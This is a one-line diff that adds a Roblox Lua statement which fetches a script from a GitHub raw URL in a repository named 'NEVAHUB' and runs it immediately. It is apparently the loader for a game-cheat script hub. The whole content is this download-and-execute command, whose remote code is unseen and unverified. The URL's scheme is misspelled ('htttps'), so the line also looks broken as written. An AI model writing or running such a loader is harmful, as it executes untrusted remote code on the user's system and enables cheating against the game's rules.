@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('htttps://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
